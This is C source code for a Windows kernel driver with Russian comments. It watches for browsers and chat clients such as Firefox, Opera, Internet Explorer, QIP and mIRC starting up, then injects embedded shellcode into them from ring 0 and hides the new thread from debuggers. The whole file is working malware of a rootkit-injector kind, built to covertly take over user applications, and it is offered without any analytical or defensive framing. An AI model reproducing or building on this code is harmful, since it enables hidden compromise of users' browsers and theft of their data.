//-----------------------------------------------------------------------
BOOLEAN InjectMemory(PVOID pMem,ULONG nSize,HANDLE hProcessId,ULONG nEpOffset){
	/*
		Inject code + create thread into ring 3.
		Status : fucked alpha
		pMem	- указатель на образ
		nSize	- размер образа
		pwcProcessName - имя процесса 
		nEpOffset- смещение точки входа в образ от pMem (образ не должен иметь импорт)
	*/
#define STACK_SIZE 0x100000					// размер стека
#define CODE_SIZE nSize						// размер кода
#define ALL_MEM (STACK_SIZE + CODE_SIZE)	// весь размер (большая пися!!11)
#undef DBG
#define DBG Dbg
	// 333032
	HANDLE	hThread = 0;
	PEPROCESS pEprocess = 0;
	NTSTATUS nStat = STATUS_UNSUCCESSFUL;
	PMDL pMdl = 0;
	PVOID pBuffer,pUserBuffer;
	BOOLEAN bRet = FALSE,bAttach = FALSE, bStopped = FALSE;
	CLIENT_ID ClientId = { 0 };
	USER_STACK UserStack = { 0 };
	CONTEXT Context = { 0 };
	PCHAR pProcessName = 0;
	ClientId.UniqueProcess = hProcessId;
	nStat = PsLookupProcessByProcessId(hProcessId,&pEprocess);
	if(!NT_SUCCESS(nStat))
	{
		DBG("Error lookup process : 0x%08X\n",nStat);
		bRet =  FALSE;
		goto end;
	}

	pProcessName = GetProcessNameByEprocess(pEprocess);
	Dbg("Start inject memory from %08X, size : %d into [%s] pid %d EPROCESS 0x%08X\n",
		pMem,ALL_MEM,pProcessName,hProcessId,pEprocess);
	
	pBuffer = ExAllocatePoolWithTag(NonPagedPool,ALL_MEM,'TEEL');
	if(!pBuffer){
		DBG("Error allocate memory for buffer\n");
		bRet = FALSE;
		goto end;
	}

	memcpy((PVOID)((ULONG)pBuffer + (ULONG)STACK_SIZE),pMem,nSize);
	DBG("Buffer allocated 0x%08X - size : %d\n",pBuffer,ALL_MEM);
	
	pMdl = IoAllocateMdl(pBuffer,ALL_MEM,0,0,0);
	if(!pMdl)
	{
		DBG("Error allocate mdl\n");
		bRet = FALSE;
		goto end;
	}
	
	KeAttachProcess(pEprocess);
	bAttach = TRUE;
	
	/*ControlThreads(hProcessId,TRUE); // suspend all threads
	bStopped = TRUE;*/

	MmBuildMdlForNonPagedPool(pMdl);
	//MmBuildMdlForNonPagedPool(pMdl);
	/*__try {
		MmProbeAndLockPages(pMdl,UserMode,IoWriteAccess);
	}	__except(EXCEPTION_EXECUTE_HANDLER){
		DBG("MmProbeAndLockPages exception!!!\n");
		bRet = FALSE;
		goto end;	
	}*/

	__try {
		pUserBuffer = MmMapLockedPagesSpecifyCache(pMdl,UserMode,MmCached,NULL,FALSE,NormalPagePriority);
	}	__except(EXCEPTION_EXECUTE_HANDLER){
		DBG("MmMapLockedPagesSpecifyCache exception!!!\n");
		bRet = FALSE;
		goto end;
	}
	
	UserStack.ExpandableStackBottom = UserStack.ExpandableStackLimit = pUserBuffer;
	UserStack.ExpandableStackBase = (PVOID)( (ULONG_PTR)pUserBuffer + STACK_SIZE);

	Context.ContextFlags = CONTEXT_FULL;
	Context.SegGs = 0;
	Context.SegFs = 0x3B;
	Context.SegEs = 0x23;
	Context.SegDs = 0x23;
	Context.SegSs = 0x23;
	Context.SegCs = 0x1B;
	Context.EFlags = 0x3000;
	Context.Esp = (ULONG)UserStack.ExpandableStackBase - 4;
	Context.Eip = (ULONG_PTR) pUserBuffer + STACK_SIZE + nEpOffset;

	nStat = g_NtCreateThread(&hThread,THREAD_ALL_ACCESS,NULL,-1,&ClientId,&Context,&UserStack,FALSE);
	if(NT_SUCCESS(nStat))
	{
		bRet = TRUE;
		DBG("Thread started. EIP : 0x%08X,ESP : 0x%08X, ThreadID: 0x%08X\n",Context.Eip,Context.Esp,ClientId.UniqueThread);
		if(NT_SUCCESS(nStat = g_NtSetInformationThread(hThread, ThreadHideFromDebugger, NULL, 0)))
			DBG("Thread 0x%08X,TID 0x%08X hidded from debugger\n",hThread,ClientId.UniqueThread);
		else	
			DBG("Error hide thread from debugger. Status : 0x%08X\n",nStat);
	}   else    {
		DBG("Error start thread : 0x%08X\n",nStat);
		bRet = FALSE;
	}    

	/*ControlThreads(hProcessId,FALSE); // resume all threads
	bStopped = FALSE;*/
	KeDetachProcess();
	bAttach = FALSE;

end: 
	/*if(bStopped)	// resume all threads
		ControlThreads(hProcessId,FALSE);*/
	if(bAttach)		// detach
		KeDetachProcess();
	if(pEprocess)	// free eprocess
		ObDereferenceObject(pEprocess);

	// освобождаем ресурсы если все пошло по пизде
	if(!bRet)
	{
		__try {
			//MmMapLockedPagesSpecifyCache
			if(pUserBuffer)
			{
				 MmUnlockPages(pMdl);
			}
			// mdl
			if(pMdl)
			{
				IoFreeMdl(pMdl);
				pMdl = NULL;
			}
			if(pBuffer)
			{
				ExFreePool(pBuffer);
				pBuffer = NULL;
			}

		}	__except(EXCEPTION_EXECUTE_HANDLER){
			DBG("Exception on end: MDL : 0x%08X, pUserBuffer : 0x%08X, pBuffer 0x%08X\n",
				pMdl,pUserBuffer,pBuffer);
			
		}
	}
	return bRet;	
#undef DBG
}

//-----------------------------------------------------------------------
BOOLEAN ProtectProcess(PUNICODE_STRING pStr)
{
	if(	_wcsnicmp(pStr->Buffer,L"iexplore.exe",pStr->Length)== 0 ||
		_wcsnicmp(pStr->Buffer,L"firefox.exe",pStr->Length) == 0 ||
		_wcsnicmp(pStr->Buffer,L"qip.exe",pStr->Length)		== 0 ||
		_wcsnicmp(pStr->Buffer,L"opera.exe",pStr->Length)	== 0 ||
		_wcsnicmp(pStr->Buffer,L"mirc.exe",pStr->Length)	== 0 ||
		_wcsnicmp(pStr->Buffer,L"psi.exe",pStr->Length)		== 0)
			return TRUE;

	return FALSE;
}
//-----------------------------------------------------------------------
PVOID InjectThread(PVOID lParam)
{
	InjectParam *InjectInfo = lParam;
	LARGE_INTEGER Interval;
	PSYSTEM_PROCESSES pProcessInfo;
	PVOID pInfo;
	BOOL bInjected = FALSE;
	ULONG nCount = 10;
	Interval.QuadPart = -(10000 * 10000);

	do {
		KeDelayExecutionThread(KernelMode,FALSE,&Interval);
		pInfo = pProcessInfo = GetSysInfo(SystemProcessesAndThreadsInformation);
		if(!pInfo)
		{
			Dbg("[ERROR] : InjectThread : Error get sys info\n");
			break;
		}
		// find our process
		__try {
			while(pProcessInfo){
				if(pProcessInfo->ProcessName.Buffer){
					if(ProtectProcess(&pProcessInfo->ProcessName))
						break;
				}

				if(	pProcessInfo->NextEntryDelta != 0)
					pProcessInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcessInfo)+ pProcessInfo->NextEntryDelta);
				else
					pProcessInfo = NULL;
			}
		}	__except(EXCEPTION_EXECUTE_HANDLER){
			Dbg("[ERROR] InjectThread : Exception. Line %d File %s",__LINE__,__FILE__);
			break;
		}

		if(pProcessInfo && !bInjected)
		{
			if(!InjectMemory(InjectInfo->pShellCode,InjectInfo->nSize,pProcessInfo->ProcessId,InjectInfo->nOffset))
			{
				g_InjectedProcessId = 0;
				g_bInjected = FALSE;
				bInjected = FALSE;
				Dbg("Error inject into [%ws][0x%08X]\n",pProcessInfo->ProcessName,pProcessInfo->ProcessId);
			}	else	{
				g_bInjected = TRUE;
				bInjected = TRUE;
				g_InjectedProcessId = pProcessInfo->ProcessId;
				Dbg("Injected to 0x%08X...\n",g_InjectedProcessId);	
			}
		}	else	{
			g_bInjected = FALSE;
			Dbg("Error find process, sleep...\n");
		}
		ExFreePool(pInfo);
		nCount--;
	}	while(!g_bInjected || !bInjected && nCount > 0);
	ExFreePool(lParam);
	PsTerminateSystemThread(0);
	return 0;
}
//-----------------------------------------------------------------------
VOID NotifyRoutine(IN HANDLE ParentId,IN HANDLE ProcessId,IN BOOLEAN Create)
{
	PEPROCESS pProc = 0 ;
	CHAR pProcessName[16] = { 0 };
	CHAR pCurProc[16] = { 0 };
	InjectParam *InjectInfo;
	UNICODE_STRING usProcessName = { 0 };
	ANSI_STRING	asProcessName = { 0 };

	HANDLE hThread;
	
	Dbg("Notify routine. ParentID[0x%08X] , ProcessId[0x%08X], %s\n",
		ParentId,ProcessId,Create ? "Create" : "Terminate" );

	if(Create)
	{	// если создается процесс  
		if(g_bInjected == FALSE && IoGetCurrentProcess != ProcessId)
		{	// если ещё не заинжектились и создаваемый процесс не являемся мы
			PsLookupProcessByProcessId(ProcessId,&pProc);		
			if(pProc)
			{			
				strcpy((PCHAR)&pProcessName,GetProcessNameByEprocess(pProc));
				strlow((PCHAR)&pProcessName);
				RtlInitAnsiString(&asProcessName,pProcessName);
				if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&usProcessName,&asProcessName,TRUE)))
				{
					if(	(ProtectProcess(&usProcessName) ))
					{
						InjectInfo = ExAllocatePoolWithTag(NonPagedPool,sizeof(InjectParam),'TEEL');
						if(InjectInfo)
						{
							InjectInfo->pShellCode = &dll_inject_shellcode;
							InjectInfo->nSize = sizeof(dll_inject_shellcode);
							InjectInfo->nOffset = 0x6E;
							if(!NT_SUCCESS(PsCreateSystemThread(&hThread, 0x1F03FFu, 0, 0, 0, (PVOID)InjectThread,InjectInfo)))
							{
								Dbg("Cant create thread for InjectThread routine\n");
							}
						}
					}
				}
			}
		}
	}	else	{
		if(ProcessId == g_InjectedProcessId)
		{
			Dbg("Drop inject info\n");
			g_InjectedProcessId = 0;
			g_bInjected = FALSE;
		}
	}
}
